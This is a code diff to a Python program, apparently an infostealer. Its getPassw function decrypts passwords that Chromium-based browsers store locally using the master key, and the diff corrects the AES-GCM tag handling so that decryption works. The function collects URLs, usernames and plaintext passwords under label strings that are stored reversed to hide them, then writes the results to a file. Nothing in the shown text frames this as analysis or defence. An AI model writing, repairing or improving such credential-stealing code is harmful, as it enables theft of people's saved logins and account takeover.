@@ -1565,11 +1565,12 @@ def getPassw(path, arg):
             starts = buff.decode(encoding='utf8', errors='ignore')[:3]
             if starts in ['v10', 'v11']:
                 iv = buff[3:15]
-                payload = buff[15:]
-                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
+                tag = buff[-16:]  
+                payload = buff[15:-16]  
+                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
                 decryptor = cipher.decryptor()
                 decrypted_pass = decryptor.update(payload) + decryptor.finalize()
-                decrypted_pass = decrypted_pass[:-16].decode('utf-8')
+                decrypted_pass = decrypted_pass.decode('utf-8')
                 return decrypted_pass
         global Passw, PasswCount
         if not os.path.exists(path): return
@@ -1609,8 +1610,8 @@ def getPassw(path, arg):
                 Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {decrval(row[2], master_key)}")
                 PasswCount += 1
         writeforfile(Passw, 'passw')
-    except:
-        pass
+    except Exception as e:
+        print(e)
     
 def getinfo():
     try:
